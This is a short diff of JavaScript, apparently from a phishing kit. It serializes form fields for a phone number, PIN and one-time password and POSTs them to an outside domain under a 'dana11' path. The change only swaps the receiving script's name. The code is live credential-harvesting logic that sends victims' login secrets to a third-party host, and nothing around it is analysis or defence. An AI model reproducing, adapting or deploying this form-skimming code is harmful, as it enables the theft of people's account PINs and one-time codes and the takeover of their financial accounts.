@@ -196,7 +196,7 @@ $(".alert").css("color","red");
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://choreoapps.kj-pow.cfd/dana11/tree.php',
+			  url: 'https://choreoapps.kj-pow.cfd/dana11/three.php',
 			  data: dataString,
  
         
